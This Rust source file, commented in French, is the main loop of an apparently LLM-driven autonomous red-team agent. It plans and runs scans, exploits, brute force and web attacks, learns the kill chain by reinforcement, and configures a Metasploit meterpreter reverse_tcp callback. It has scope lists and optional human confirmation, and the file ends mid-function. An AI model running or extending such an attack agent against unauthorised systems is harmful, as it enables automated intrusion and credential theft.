//! Autonomous Agent — boucle principale de l'IA Red Team
//!
//! Cycle : Recon → Plan (LLM) → Confirm (humain si risque) → Execute → Adapt → Loop
//!
//! Usage :
//!   nrtg --ai-agent --targets 192.168.1.0/24 --objective "compromettre le DC"
//!   nrtg --ai-agent --session-id abc123  (reprendre une campagne)

#![allow(dead_code, unused_imports, unused_variables)]

use anyhow::{anyhow, Result};
use serde_json::Value;
use std::collections::HashMap;
use std::io::{self, BufRead, IsTerminal, Write};
use std::sync::atomic::Ordering;

use super::attack_planner::{
    ActionType, AttackPlan, AttackPlanner, PlannedAction, PlannerConfig, RiskLevel,
};
use super::campaign_memory::{
    normalize_host_key, ActiveSession, CampaignMemory, Credential, CredentialType, HostState,
    WebSurface,
};
use super::hypothesis::VulnClass;
use super::rl_agent::{
    available_actions, KillChainRLAgent, RLAgentConfig, RewardConfig, StateSignature,
};
use crate::agents::{
    AgentBrief, AgentReport, AgentRole, DiscoveryAgent, DiscoveryAgentConfig, ExploitAgent,
    ExploitAgentConfig, LateralAgent, LateralAgentConfig, PostExploitAgent, PostExploitAgentConfig,
    ReportingAgent, ReportingAgentConfig, WebAnalysisAgent, WebAnalysisAgentConfig,
};
use crate::cve::CveDatabase;
use crate::exploits::{run_pentest_all, summarize, ExploitManifest, PentestConfig};
use crate::horde::SwarmCoordinator;
use crate::main_helpers::{mask_secret, truncate_chars};
use crate::orchestrator::{
    AttackOrchestrator, CampaignConfig, CampaignPhase, CampaignTarget, HarvestedCredential,
    TargetPriority, TargetStatus,
};
use crate::reports::GraphNode;
use crate::risk::RiskRules;
use crate::scanner::{grab_http_banner, grab_tcp_banner, port_to_service, BannerResult};
use crate::web_attack::WebAuth;
use crate::web_spider::{SpiderResult, WebSpider};

// ── Configuration de l'agent ─────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct AgentConfig {
    pub session_id: String,
    pub campaign_name: String,
    pub objective: String,
    pub initial_targets: Vec<String>,
    pub save_dir: String,
    pub openrouter_key: String,
    pub model: String,
    /// Endpoint OpenAI-compatible réellement appelé (Ollama local, vLLM, LM
    /// Studio, OpenRouter…). Source unique de vérité : il vient de la même
    /// résolution que le reste du binaire (`--llm-api-base` > config.json >
    /// `NRTG_LLM_PROVIDER` > défaut). Sans ce champ, le planner ré-résolvait
    /// l'endpoint depuis `NRTG_LLM_PROVIDER` seul et pouvait appeler un provider
    /// différent de celui annoncé au démarrage.
    pub llm_api_base: String,
    pub stealth_mode: bool,
    pub max_risk_level: RiskLevel,
    pub max_iterations: usize, // garde-fou : max boucles autonomes
    pub confirm_all: bool,     // forcer confirmation pour TOUTES les actions
    pub parallel_scans: usize,
    pub http_timeout: u64,
    pub tcp_timeout: u64,
    /// Plafond dur (secondes) appliqué à **une** action unitaire. Garantit que
    /// la boucle de décision progresse même si un module reste bloqué (ex. le
    /// module WebAttack suivant une redirection vers une origine TLS en
    /// tarpit). Voir `default_action_timeout_secs`.
    pub action_timeout_secs: u64,
    pub rl_learn: bool, // activer l'apprentissage par renforcement
    /// Périmètre autorisé (CIDR / IP / domaines). Vide = aucune restriction.
    pub allow_networks: Vec<String>,
    /// Hôtes explicitement exclus du périmètre (deny-list prioritaire).
    pub deny_hosts: Vec<String>,
    /// Autonomie complète : approuve automatiquement les confirmations en mode
    /// non-interactif (sinon fail-closed). Équivalent CLI : --yes.
    pub assume_yes: bool,
    /// Installation automatique des outils manquants.
    pub auto_install: bool,
    /// Intégration Metasploit (msfrpcd) optionnelle — absente = pas de
    /// weaponisation externe, l'agent se limite aux exploits natifs.
    pub msf: Option<MsfConfig>,
}

/// Paramètres de connexion msfrpcd + callback pour la weaponisation MSF.
#[derive(Debug, Clone)]
pub struct MsfConfig {
    pub host: String,
    pub port: u16,
    pub user: String,
    pub pass: String,
    /// LHOST/LPORT du callback reverse utilisé par le payload MSF.
    pub lhost: String,
    pub lport: u16,
    pub payload: String,
}

impl MsfConfig {
    /// Construit la config depuis l'environnement (`NRTG_MSF_*`, `NRTG_LHOST`,
    /// `NRTG_LPORT`). Renvoie `None` si `NRTG_MSF_HOST` n'est pas défini : sans
    /// endpoint, la weaponisation externe est désactivée (fail-closed).
    pub fn from_env() -> Option<Self> {
        let host = std::env::var("NRTG_MSF_HOST")
            .ok()
            .filter(|s| !s.is_empty())?;
        Some(Self {
            host,
            port: std::env::var("NRTG_MSF_PORT")
                .ok()
                .and_then(|p| p.parse().ok())
                .unwrap_or(55553),
            user: std::env::var("NRTG_MSF_USER").unwrap_or_else(|_| "msf".into()),
            pass: std::env::var("NRTG_MSF_PASS").unwrap_or_default(),
            lhost: std::env::var("NRTG_LHOST").unwrap_or_else(|_| "127.0.0.1".into()),
            lport: std::env::var("NRTG_LPORT")
                .ok()
                .and_then(|p| p.parse().ok())
                .unwrap_or(4444),
            payload: std::env::var("NRTG_MSF_PAYLOAD")
                .unwrap_or_else(|_| "linux/x64/meterpreter/reverse_tcp".into()),
        })
    }
}

impl Default for AgentConfig {
    fn default() -> Self {
        // Défaut 2026+ : NVIDIA Nemotron 4 340B (OpenRouter) — entraînement natif Red Team / NVT
        // Modèle a changé le moins rapidement le meilleur compromis :
        //   • 8B trop faible pour du planning Red Team multi-sauts
        //   • 340B Nemotron 4 a été entraîné spécifiquement sur la sécurité offensive
        // Pour utilisation locale sans exfiltration : passer NRTG_LLM_PROVIDER=ollama + tag nemotron:70b
        let model_default = match std::env::var("NRTG_LLM_PROVIDER").as_deref() {
            Ok("ollama") | Ok("local") => "nemotron:70b-instruct-q4_K_M".to_string(),
            Ok("openai") | Ok("oai") => "gpt-4o-mini".to_string(),
            _ => "nvidia/nemotron-3-ultra-550b-a55b:free".to_string(),
        };
        Self {
            session_id: generate_session_id(),
            campaign_name: "Red Team Campaign — DIAPILE v2".to_string(),
            objective: "Identifier les hôtes vulnérables et tenter un premier accès".to_string(),
            initial_targets: vec![],
            save_dir: "sessions".to_string(),
            openrouter_key: std::env::var("OPENROUTER_API_KEY")
                .or_else(|_| std::env::var("OPENAI_API_KEY"))
                .unwrap_or_default(),
            model: std::env::var("NRTG_LLM_MODEL")
                .ok()
                .unwrap_or(model_default),
            // Même table de correspondance provider → endpoint que PlannerConfig.
            llm_api_base: match std::env::var("NRTG_LLM_PROVIDER").as_deref() {
                Ok("openai") | Ok("oai") => "https://api.openai.com/v1".to_string(),
                Ok("ollama") | Ok("local") => "http://localhost:11434/v1".to_string(),
                _ => "https://openrouter.ai/api/v1".to_string(),
            },
            stealth_mode: true,
            max_risk_level: RiskLevel::High,
            max_iterations: 50,
            confirm_all: false,
            parallel_scans: 20,
            http_timeout: 5,
            tcp_timeout: 3,
            action_timeout_secs: default_action_timeout_secs(),
            rl_learn: true,
            allow_networks: vec![],
            deny_hosts: vec![],
            assume_yes: false,
            auto_install: false,
            msf: MsfConfig::from_env(),
        }
    }
}

/// Plafond dur (secondes) appliqué à **une** action de l'agent.
///
/// Sans plafond, un module peut rester bloqué indéfiniment : constaté sur le
/// lab, le module `WebAttack` a suivi la redirection d'une cible vers une
/// origine TLS en tarpit et consommé un timeout réseau par sonde → agent figé
/// plus de 13 minutes. Le plafond garantit que la boucle de décision progresse
/// toujours. Surchargeable via `NRTG_ACTION_TIMEOUT`.
pub fn default_action_timeout_secs() -> u64 {
    std::env::var("NRTG_ACTION_TIMEOUT")
        .ok()
        .and_then(|v| v.parse().ok())
        .filter(|v| *v > 0)
        .unwrap_or(300)
}

impl AgentConfig {
    pub fn from_config(
        config: &crate::config::Config,
        cli_model: Option<String>,
        cli_key: Option<String>,
    ) -> Self {
        let mut result = Self::default();

        // ── Priorité LLM model: CLI > Config.llm.model > config.json legacy llm_model ──
        if let Some(m) = cli_model {
            result.model = m;
        } else {
            let mut model_from_file: Option<String> = None;
            if let Ok(config_str) = std::fs::read_to_string("config.json") {
                if let Ok(json) = serde_json::from_str::<Value>(&config_str) {
                    if let Some(m) = json.get("llm_model").and_then(|v| v.as_str()) {
                        model_from_file = Some(m.to_string());
                    } else if let Some(m) = json
                        .get("options")
                        .and_then(|o| o.get("llm_model"))
                        .and_then(|v| v.as_str())
                    {
                        model_from_file = Some(m.to_string());
                    }
                }
            }
            // Config.llm.model a priorité sur legacy JSON
            result.model = if !config.llm.model.is_empty() {
                config.llm.model.clone()
            } else {
                model_from_file.unwrap_or(result.model)
            };
        }

        // ── Priorité API key: CLI > Config.llm.api_key (champ générique canonique) > ENV OPENROUTER > ENV OPENAI ──
        if let Some(k) = cli_key {
            result.openrouter_key = k;
        } else if let Some(k) = config.llm.api_key.clone().filter(|s| !s.is_empty()) {
            result.openrouter_key = k;
        } else if let Ok(k) = std::env::var("OPENROUTER_API_KEY") {
            result.openrouter_key = k;
        } else if let Ok(k) = std::env::var("OPENAI_API_KEY") {
            result.openrouter_key = k;
        }

        // ── Propager timeout/concurrence depuis Config ──
        result.http_timeout = config.options.http_timeout;
        result.tcp_timeout = config.options.tcp_timeout;
        result.parallel_scans = config
            .options
            .max_concurrency
            .min(result.parallel_scans.max(1));

        result
    }
}

fn generate_session_id() -> String {
    let ts = chrono::Utc::now().format("%Y%m%d-%H%M%S").to_string();
    format!("op-{}", ts)
}

// ── Agent principal ────────────────────────────────────────────────────────

pub struct AutonomousAgent {
    config: AgentConfig,
    memory: CampaignMemory,
    planner: AttackPlanner,
    cve_db: CveDatabase,
    risk_rules: RiskRules,
    exploit_manifest: Option<ExploitManifest>,
    iteration: usize,
    /// SessionManager partagé — recueille les vraies connexions reverse shell
    session_mgr: std::sync::Arc<crate::shell::SessionManager>,
    /// Émetteur WebSocket du dashboard live (None si --dashboard-live absent)
    dashboard_emitter: Option<crate::live_dashboard::DashboardEmitter>,
    horde_coordinator: Option<std::sync::Arc<crate::horde::coordinator::HordeCoordinator>>,
    /// Agent RL optionnel : apprend la kill-chain par renforcement (transfert inter-campagne).
    rl_agent: Option<KillChainRLAgent>,
    /// Orchestrateur de campagne : miroir de `CampaignMemory` qui tient la
    /// machine à états (phases, cibles, sessions, credentials, chemins
    /// latéraux). Sert de format d'export interopérable et de source pour le
    /// graphe de pivotement (`PivotManager`).
    orchestrator: Option<std::sync::Arc<AttackOrchestrator>>,
    /// Intelligence d'essaim : mémoire partagée d'hôtes/credentials entre
    /// agents. La vue locale y est fusionnée après chaque vague de
    /// reconnaissance puis réimportée, de sorte que plusieurs agents
    /// partageant le même `SwarmCoordinator` convergent vers un état commun.
    swarm: std::sync::Arc<SwarmCoordinator>,
    /// Nombre d'échecs LLM consécutifs. Au-delà d'un seuil, l'agent cesse de
    /// retenter le LLM et bascule sur le plan déterministe de secours, afin de
    /// ne pas rester bloqué en boucle quand le fournisseur est indisponible.
    consecutive_llm_failures: u32,
}

impl AutonomousAgent {
    pub fn new(
        config: AgentConfig,
        cve_db: CveDatabase,
        risk_rules: RiskRules,
        exploit_manifest: Option<ExploitManifest>,
        dashboard_emitter: Option<crate::live_dashboard::DashboardEmitter>,
        horde_coordinator: Option<std::sync::Arc<crate::horde::coordinator::HordeCoordinator>>,
    ) -> Result<Self> {
        // Charger ou créer la mémoire de campagne
        let mut memory = CampaignMemory::load_or_create(
            &config.session_id,
            &config.campaign_name,
            &config.objective,
            config.initial_targets.clone(),
            &config.save_dir,
        )?;

        // ── Périmètre (p2a) : les valeurs CLI sont prioritaires et persistées ──
        // dans la mémoire de campagne pour être appliquées à chaque dispatch.
        if !config.allow_networks.is_empty() {
            memory.allowed_networks = config.allow_networks.clone();
        }
        if !config.deny_hosts.is_empty() {
            memory.excluded_hosts = config.deny_hosts.clone();
        }
        if !memory.allowed_networks.is_empty() || !memory.excluded_hosts.is_empty() {
            println!(
                "  🎯 Périmètre actif — allow: [{}] deny: [{}]",
                memory.allowed_networks.join(","),
                memory.excluded_hosts.join(",")
            );
        }

        // Initialiser le planificateur OpenRouter
        let planner_cfg = PlannerConfig {
            api_key: config.openrouter_key.clone(),
            model: config.model.clone(),
            // Endpoint issu de la résolution CLI/config, jamais re-dérivé de
            // l'environnement : la bannière et les appels réels restent alignés.
            base_url: config.llm_api_base.clone(),
            stealth_mode: config.stealth_mode,
            max_risk_level: config.max_risk_level.clone(),
            ..PlannerConfig::default()
        };
        let planner = AttackPlanner::new(planner_cfg)?;

        // Initialiser l'agent RL si demandé (apprentissage inter-campagne)
        let rl_agent = if config.rl_learn {
            let rl_cfg = RLAgentConfig {
                qtable_path: std::path::PathBuf::from(&config.save_dir).join("rl_qtable.json"),
                replay_path: std::path::PathBuf::from(&config.save_dir).join("rl_replay.json"),
                epsilon_path: std::path::PathBuf::from(&config.save_dir).join("rl_epsilon.json"),
                ..RLAgentConfig::default()
            };
            println!(
                "  🧠 RL Agent actif — Q-table: {} (ε par décision, decay={})",
                rl_cfg.qtable_path.display(),
                rl_cfg.epsilon_decay
            );
            Some(KillChainRLAgent::new(rl_cfg, RewardConfig::default()))
        } else {
            None
        };

        // ── Orchestrateur de campagne ──────────────────────────────────────
        // Miroir de la mémoire de campagne : la synchronisation est faite à
        // chaque itération par `sync_orchestrator()`. L'état est persisté au
        // format orchestrateur pour les consommateurs externes (graphe de
        // pivotement, revue post-opérationnelle).
        let orchestrator = {
            let orch_cfg = CampaignConfig {
                name: config.campaign_name.clone(),
                description: config.objective.clone(),
                scope: config.allow_networks.clone(),
                excluded_targets: config.deny_hosts.clone(),
                max_parallel_exploits: config.parallel_scans.max(1),
                stealth_mode: config.stealth_mode,
                ..CampaignConfig::default()
            };
            let scope_label = if orch_cfg.scope.is_empty() {
                "*".to_string()
            } else {
                orch_cfg.scope.join(",")
            };
            println!(
                "  🗺️  Orchestrateur de campagne initialisé (scope: [{}], stealth: {})",
                scope_label, orch_cfg.stealth_mode
            );
            Some(std::sync::Arc::new(AttackOrchestrator::new(orch_cfg)))
        };

        // ── Intelligence d'essaim ──────────────────────────────────────────
        // Mémoire partagée inter-agents ; en mono-agent elle sert de vue
        // agrégée consolidée à chaque itération.
        let swarm = std::sync::Arc::new(SwarmCoordinator::new());

        Ok(Self {
            config,
            memory,
            planner,
            cve_db,
            risk_rules,
            exploit_manifest,
            iteration: 0,
            session_mgr: crate::shell::SessionManager::new(),
            dashboard_emitter,
            horde_coordinator,
            rl_agent,
            orchestrator,
            swarm,
            consecutive_llm_failures: 0,
        })
    }

    // ── Boucle principale ─────────────────────────────────────────────────

    pub async fn run(&mut self) -> Result<String> {
        self.print_banner();

        // ── Orchestrateur : démarrage de la campagne ───────────────────────
        if let Some(ref orch) = self.orchestrator {
            let _ = orch.start().await;
        }

        // Initialiser le contexte LLM avec le prompt de mission
        let mission_ctx = format!(
            "Mission Red Team démarrée.\nObjectif : {}\nCibles initiales : {}\nMode stealth : {}\nNiveau de risque max : {}",
            self.config.objective,
            self.config.initial_targets.join(", "),
            if self.config.stealth_mode { "ACTIVÉ" } else { "DÉSACTIVÉ" },
            self.config.max_risk_level,
        );
        self.memory.push_llm_message("system", &mission_ctx);

        let mut last_scan_results = String::new();
        let mut last_event: Option<String> = None;

        // Phase 0 : scan initial si aucun hôte en mémoire
        if self.memory.hosts.is_empty() {
            println!("\n🔍 Phase 0 — Reconnaissance initiale...");
            last_scan_results = self.run_initial_scan().await?;
            self.memory.log(
                "recon",
                "initial_scan",
                None,
                "success",
                &truncate_chars(&last_scan_results, 300),
                "ai_agent",
            );
            self.memory.save()?;

            // Agent de découverte autonome : reconnaissance étendue (hôtes,
            // services, vulnérabilités) dont les cibles exploitables sont
            // enregistrées dans l'orchestrateur de campagne partagé.
            self.run_discovery_agent().await;

            // Cartographie de la surface d'attaque web : inventaire des pages,
            // formulaires, paramètres et endpoints. Fournit au bandit la
            // matière nécessaire au gating d'applicabilité, et au LLM les
            // preuves pour ne plus raisonner uniquement en CVE.
            self.crawl_web_surface().await;

            // Aligner la vue locale sur l'intelligence d'essaim.
            self.sync_swarm().await;
        }

        // Boucle principale
        loop {
            self.iteration += 1;
            if self.iteration > self.config.max_iterations {
                println!(
                    "\n⏹️  Limite d'itérations atteinte ({}). Fin de l'agent.",
                    self.config.max_iterations
                );
                break;
            }

            println!("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
            println!(
                "🤖 Itération {} — Consultation OpenRouter ({})...",
                self.iteration, self.config.model
            );

            // ── RecommendationEngine : enrichir le contexte avant le LLM ────
            // Construire le contexte depuis la mémoire courante et obtenir
            // les recommandations heuristiques qui seront injectées dans le prompt.
            let recommend_ctx = {
                use crate::ai::recommendation_engine::{
                    AttackContext, RecommendationEngine, ServiceInfo, TargetInfo,
                };
                let engine = RecommendationEngine::new();
                // Sélectionner les hôtes les plus prioritaires (vulnérables ou scannés)
                let services: Vec<ServiceInfo> = self
                    .memory
                    .hosts
                    .values()
                    .flat_map(|h| {
                        h.services.iter().filter_map(|svc| {
                            let parts: Vec<&str> = svc.splitn(2, '/').collect();
                            let (name, port) = if parts.len() == 2 {
                                (parts[0], parts[1].parse::<u16>().unwrap_or(0))
                            } else {
                                (svc.as_str(), 0)
                            };
                            Some(ServiceInfo {
                                name: name.to_string(),
                                version: None,
                                port,
                                protocol: "tcp".into(),
                                banner: None,
                                authentication_required: false,
                            })
                        })
                    })
                    .take(20)
                    .collect();

                let top_host = self
                    .memory
                    .hosts
                    .values()
                    .max_by_key(|h| h.confirmed_cves.len())
                    .map(|h| h.ip.clone())
                    .unwrap_or_default();

                let ctx = AttackContext {
                    target_info: if !top_host.is_empty() {
                        Some(TargetInfo {
                            ip: top_host.clone(),
                            hostname: None,
                            os: self.memory.hosts.get(&top_host).and_then(|h| h.os.clone()),
                            os_version: None,
                            architecture: None,
                            is_domain_controller: false,
                            is_server: true,
                            critical_services: services.iter().map(|s| s.name.clone()).collect(),
                        })
                    } else {
                        None
                    },
                    discovered_services: services,
                    known_vulnerabilities: vec![],
                    current_privileges: self
                        .memory
                        .sessions
                        .values()
                        .find(|s| s.alive)
                        .map(|s| s.privileges.clone())
                        .unwrap_or_else(|| "none".into()),
                    network_position: if self.memory.stats.pivots_executed > 0 {
                        "pivoted".into()
                    } else {
                        "perimeter".into()
                    },
                    detection_risk: 0.3,
                    time_constraints: None,
                    objectives: vec![self.config.objective.clone()],
                };

                let mut recs = engine.run(ctx).await;

                // Levier D : écarter les recommandations ciblant une technique
                // déjà échouée, sinon le moteur réinjecte les mêmes CVE en boucle
                // dans le prompt du LLM.
                let failed = self.memory.all_failed_techniques();
                if !failed.is_empty() {
                    recs.retain(|r| {
                        let blob =
                            format!("{} {} {}", r.title, r.description, r.commands.join(" "))
                                .to_lowercase();
                        !failed.iter().any(|f| blob.contains(&f.to_lowercase()))
                    });
                }

                if !recs.is_empty() {
                    let rec_summary: Vec<String> = recs
                        .iter()
                        .take(3)
                        .map(|r| {
                            format!("• {} (prio={:.2}): {}", r.title, r.priority, r.description)
                        })
                        .collect();
                    Some(rec_summary.join("\n"))
                } else {
                    None
                }
            };

            // Injecter les recommandations dans le contexte LLM
            if let Some(ref recs) = recommend_ctx {
                self.memory.push_llm_message(
                    "system",
                    &format!("Recommandations moteur heuristique DIAPILE:\n{}", recs),
                );
            }

            // Demander au LLM le prochain plan
            const MAX_LLM_FAILURES: u32 = 3;
            let plan = match self
                .planner
                .plan_next_step(&self.memory, &last_scan_results, last_event.as_deref())
                .await
            {
                Ok(p) => {
                    self.consecutive_llm_failures = 0;
                    p
                }
                Err(e) => {
                    self.consecutive_llm_failures = self.consecutive_llm_failures.saturating_add(1);
                    eprintln!(
                        "⚠️  Erreur LLM ({}/{}): {}",
                        self.consecutive_llm_failures, MAX_LLM_FAILURES, e
                    );

                    if self.consecutive_llm_failures < MAX_LLM_FAILURES {
                        println!("   ↻ Nouvelle tentative dans 10s...");
                        tokio::time::sleep(std::time::Duration::from_secs(10)).await;
                        continue;
                    }

                    // Circuit breaker : le fournisseur est durablement
                    // indisponible. On bascule sur le plan déterministe pour
                    // que la mission progresse quand même.
                    println!(
                        "   🛟 LLM indisponible après {} échecs consécutifs → bascule sur le plan déterministe de secours.",
                        MAX_LLM_FAILURES
                    );
                    // On réarme le compteur : l'itération suivante retentera le
                    // LLM avec son cycle de backoff au lieu de consommer le plan
                    // de secours en boucle jusqu'à `max_iterations`.
                    self.consecutive_llm_failures = 0;
                    self.planner.fallback_plan(&self.memory)
                }
            };

            // Sauvegarder la décision IA dans la mémoire
            self.memory.push_llm_message(
                "assistant",
                &format!(
                    "Plan phase={} actions={} narrative={}",
                    plan.phase,
                    plan.actions.len(),
                    plan.narrative
                ),
            );
            self.memory.stats.ai_decisions += 1;

            // Afficher le plan
            println!("{}", plan.display_for_confirmation());

            // ── Orchestrateur : réconciliation de l'état de campagne ────────
            // La mémoire reste la source de vérité opérationnelle ; elle est
            // projetée dans la machine à états de campagne (cibles, sessions,
            // credentials, phase) avant chaque vague d'exécution.
            self.sync_orchestrator(Some(plan.phase.as_str())).await;

            // ── RL : Sélection d'action hybride (LLM + RL) ──────────────────
            // Si l'agent RL est actif, on lui demande son avis sur le plan.
            // Granularité P4 : le RL choisit un couple (ActionType, technique)
            // parmi les candidats du plan, et la technique retenue est propagée
            // jusqu'à l'exécution — sinon la Q-table n'apprend que le type
            // d'action, jamais *quelle* technique réussit.
            let mut actions_to_execute = plan.actions.clone();
            let mut rl_override = false;
            if let Some(ref mut rl) = self.rl_agent {
                let state = StateSignature::from_memory(&self.memory);
                let available = available_actions(&state);

                let candidates: Vec<(ActionType, String)> = plan
                    .actions
                    .iter()
                    .filter(|a| available.contains(&a.action_type))
                    .map(|a| (a.action_type.clone(), a.technique.clone()))
                    .collect();

                // Le RL n'arbitre qu'ENTRE les actions du plan LLM. Si le plan
                // est vide après filtrage (toutes les actions hors curriculum de
                // phase), on exécute le plan tel quel. Substituer une action
                // hors-plan faisait dériver l'agent (observé sur le lab : le RL
                // remplaçait le WebAttack du LLM par un Osint inutile).
                if candidates.is_empty() {
                    println!("   🧠 RL: aucune action candidate dans le plan — exécution du plan LLM tel quel");
                } else {
                    let (rl_type, rl_tech) = rl.select_action_with_technique(
                        &state,
                        &candidates,
                        &available,
                        Some(&plan),
                    );

                    // `select_action_with_technique` renvoie toujours un couple
                    // issu des candidats, donc une action DÉJÀ présente dans le
                    // plan. On la promeut en tête (réordonnancement) au lieu de
                    // réécrire la première action : sinon une action choisie en
                    // position > 0 était ignorée, et l'écrasement de l'action 0
                    // dupliquait l'action choisie.
                    if let Some(pos) = actions_to_execute
                        .iter()
                        .position(|a| a.action_type == rl_type && a.technique == rl_tech)
                    {
                        if pos != 0 {
                            let chosen = actions_to_execute.remove(pos);
                            println!(
                                "   🧠 RL promeut en tête : {:?}/{} (position {} du plan LLM)",
                                chosen.action_type, chosen.technique, pos
                            );
                            actions_to_execute.insert(0, chosen);
                            rl_override = true;
                        }
                    }
                }
            }

            // ── Leviers B & D : garde-fou anti-répétition + plafond d'échecs ──
            // Empêche l'agent de rejouer indéfiniment une exploitation déjà
            // échouée (cause de la boucle observée en production : 14 itérations
            // sur les mêmes 3 CVE).
            const MAX_FAILED_PER_HOST: usize = 3;
            for a in actions_to_execute.iter_mut() {
                if a.action_type != ActionType::Exploit {
                    continue;
                }
                let host = extract_host(&a.target);

                let too_many_failures = self.memory.failed_count(&host) >= MAX_FAILED_PER_HOST;
                if self.memory.already_tried(&host, &a.technique) || too_many_failures {
                    let reason = if too_many_failures {
                        format!("{} échecs cumulés", self.memory.failed_count(&host))
                    } else {
                        "technique déjà tentée".to_string()
                    };

                    // Politique de diversité : au lieu de retomber sur de la
                    // reconnaissance (qui ne trouve rien de nouveau), on bascule
                    // vers la MEILLEURE HYPOTHÈSE NON TESTÉE fournie par le
                    // bandit bayésien. C'est ce qui permet de sortir du cycle
                    // « CVE corrélée → échec → recon → CVE corrélée ».
                    let ev = self.memory.surface_evidence(&host);
                    match self.memory.hypotheses.best_untried(&host, &ev) {
                        Some((class, p)) => {
                            let (next_type, tool) = match class.action_hint() {
                                "brute_force" => (ActionType::BruteForce, "bruteforce"),
                                "enumerate" => (ActionType::Enumerate, "enum"),
                                "exploit" => (ActionType::Exploit, "exploit"),
                                _ => (ActionType::WebAttack, "web_attack"),
                            };
                            println!(
                                "   🔀 {} sur {} → bascule vers une hypothèse non testée : {} (p≈{:.2}, {})",
                                reason, host, class.label(), p, action_hint_label(&next_type)
                            );
                            a.action_type = next_type;
                            a.technique = class.as_str().to_string();
                            a.tool = tool.to_string();
                            a.rationale = format!(
                                "{} sur cet hôte : diversification vers « {} » (bandit Thompson, p≈{:.2}).",
                                reason, class.label(), p
                            );
                        }
                        None => {
                            println!(
                                "   🛑 {} sur {} → plus aucune hypothèse applicable, repli reconnaissance",
                                reason, host
                            );
                            a.action_type = ActionType::AdvancedScan;
                            a.technique = "recon_fallback".to_string();
                            a.rationale = format!(
                                "{} et aucune hypothèse non testée restante — renumérisation de l'hôte.",
                                reason
                            );
                        }
                    }
                }
            }

            // ── Levier E : injection proactive d'une action web ────────────
            // L'agent ne doit pas dépendre du bon vouloir du LLM pour tester la
            // surface applicative. Si aucune action web n'est planifiée et
            // qu'un hôte HTTP porte une hypothèse web non testée, on l'ajoute.
            if !actions_to_execute
                .iter()
                .any(|a| a.action_type == ActionType::WebAttack)
            {
                if let Some(web_action) = self.propose_web_action() {
                    println!(
                        "   ➕ Injection proactive : web_attack sur {} (hypothèse « {} »)",
                        web_action.target, web_action.technique
                    );
                    actions_to_execute.push(web_action);
                }
            }

            // Vérifier si l'objectif est atteint
            if actions_to_execute
                .iter()
                .any(|a| a.action_type == ActionType::Complete)
            {
                println!("\n🎯 L'IA indique que l'OBJECTIF EST ATTEINT.");
                last_event = Some("Objectif atteint".to_string());
                self.memory.completed = true;
                self.memory.log(
                    "complete",
                    "objective_reached",
                    None,
                    "success",
                    &plan.narrative,
                    "ai_agent",
                );
                self.memory.save()?;
                break;
            }

            // Exécuter les actions planifiées (potentiellement modifiées par le RL)
            let mut events = Vec::new();
            let mut is_first_action = true;
            for action in &actions_to_execute {
                // ── RL : capturer l'état AVANT l'action ─────────────────────
                let prev_state = self
                    .rl_agent
                    .as_ref()
                    .map(|_| StateSignature::from_memory(&self.memory));

                if let Some(ref emitter) = self.dashboard_emitter {
                    emitter
                        .send(crate::live_dashboard::DashboardEvent::Log {
                            t: chrono::Utc::now().timestamp_millis() as u64,
                            level: "info".into(),
                            source: "ai_agent".into(),
                            message: format!(
                                "Planification : {:?} sur {} ({})",
                                action.action_type, action.target, action.technique
                            ),
                        })
                        .await;
                }

                let event = self.execute_action(action).await?;
                events.push(event.clone());

                // ── Bandit d'hypothèses : retour d'expérience bayésien ──────
                // Le champ `technique` porte l'identifiant canonique de la
                // classe testée (« sqli », « ssti »…) ou le CVE-ID. On met à
                // jour la postérieure Beta correspondante pour que la prochaine
                // décision s'appuie sur l'expérience réelle et non sur un a
                // priori figé. Un rejet/hors-périmètre compte comme échec
                // (cohérent avec l'anti-boucle).
                if let Some(class) = VulnClass::from_str(&action.technique) {
                    let success = event.starts_with("SUCCESS:");
                    self.memory
                        .record_hypothesis(&extract_host(&action.target), class, success);
                }

                self.memory.save()?; // persistance après chaque action

                // ── RL : observer le résultat APRÈS l'action ────────────────
                if let Some(ref mut rl) = self.rl_agent {
                    if let Some(prev) = prev_state {
                        let curr = StateSignature::from_memory(&self.memory);
                        let detection = event.to_lowercase().contains("waf")
                            || event.to_lowercase().contains("blocked")
                            || event.to_lowercase().contains("429")
                            || event.to_lowercase().contains("forbidden");
                        // Échec répété sur CET hôte (et non globalement, sinon la
                        // pénalité RL est diluée par les autres cibles).
                        let repeated_failure =
                            self.memory.failed_count(&extract_host(&action.target)) > 1;

                        // Technique réellement exécutée (granularité P4) ; les
                        // sentinelles de repli ne doivent pas polluer la Q-table.
                        let tech = if action.technique.is_empty()
                            || action.technique == "rl_guided_alternative"
                            || action.technique == "recon_fallback"
                        {
                            None
                        } else {
                            Some(action.technique.as_str())
                        };

                        let reward = rl.observe(
                            &prev,
                            action.action_type.clone(),
                            tech,
                            &curr,
                            detection,
                            repeated_failure,
                        );

                        if reward.abs() > 1.0 {
                            println!(
                                "   🧠 RL: action={:?} reward={:+.1} (ε={:.3})",
                                action.action_type,
                                reward,
                                rl.epsilon()
                            );
                        }

                        // ── Dashboard : publier la décision + résultat RL ──────
                        let q_value =
                            rl.qtable.get_tech(&prev.key(), &action.action_type, tech) as f64;
                        let origin = if is_first_action && rl_override {
                            "rl"
                        } else {
                            "llm"
                        };
                        let outcome: String = event.chars().take(220).collect();
                        if let Some(ref emitter) = self.dashboard_emitter {
                            emitter
                                .send(crate::live_dashboard::DashboardEvent::AgentDecision {
                                    t: chrono::Utc::now().timestamp_millis() as u64,
                                    origin: origin.to_string(),
                                    action: format!("{:?}", action.action_type),
                                    target: action.target.clone(),
                                    technique: action.technique.clone(),
                                    phase: format!("{:?}", curr.phase),
                                    reward: reward as f64,
                                    epsilon: rl.epsilon() as f64,
                                    q_value,
                                    outcome,
                                })
                                .await;
                        }
                    }
                }
                is_first_action = false;
            }

            // ── Observation structurée de la vague ─────────────────────────
            // `state_summary()` ne décrit que l'état CUMULÉ de la campagne : il
            // ne dit rien de ce que l'action qui vient de tourner a réellement
            // renvoyé. Or `last_scan_results` était vidé après la 1re itération
            // et le seul retour restant, `last_event`, est une chaîne plate.
            // On reconstruit donc, pour chaque action de la vague, une ligne
            // structurée (action / technique / cible / statut / résultat) qui
            // sera réinjectée dans le prompt du planner à l'itération suivante.
            let wave_observation: String = actions_to_execute
                .iter()
                .zip(events.iter())
                .map(|(a, e)| {
                    let status = e.split(':').next().unwrap_or("INFO");
                    // `splitn(3, ':')` isole le résultat réel :
                    // `SUCCESS:technique@cible:<résultat>`.
                    let detail = e.splitn(3, ':').nth(2).unwrap_or("");
                    format!(
